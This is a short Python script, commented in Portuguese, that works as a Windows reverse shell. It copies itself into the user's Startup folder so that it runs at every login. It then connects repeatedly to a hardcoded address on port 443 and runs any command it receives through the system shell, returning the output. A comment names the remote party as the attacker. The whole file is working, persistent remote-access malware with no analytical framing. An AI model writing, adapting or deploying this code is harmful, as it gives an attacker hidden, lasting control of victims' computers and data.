import socket 
import time
import subprocess
import threading
import os 


ip = "10.0.0.102" 
port = 443



# Permite conexao persistente, sempre que 
def autorun():
    filename = os.path.basename(__file__)
    exe_filename = filename.replace(".py", ".exe")
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(filename)) # Alterar isso aqui



# Define conexão com o cliente a partir do IP e porta
def connect(ip,port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ip,port))
        return client
    except Exception as error:
        print ("Erro ao rodar" , error)




# Utiliza da biblioteca subprocess para possibilitar o acesso via cmd
def cmd(client, data):
    try:
        proc = subprocess.Popen(data,shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")

    except Exception as error:
        print("error cmd", error)



# Escuta oque o atacante faz via cmd
def listen(client):
    while True:
        data = client.recv(1024).decode().strip()
        if data == "/exit":
            exit()
        else:
            threading.Thread(target=cmd, args=(client,data)).start()
       
       
            
if __name__ == "__main__":
    autorun()
    while True:
        client = connect(ip,port)
        if client:
            listen(client)
        else:
            print("Erro ao conectar")
            time.sleep(2)
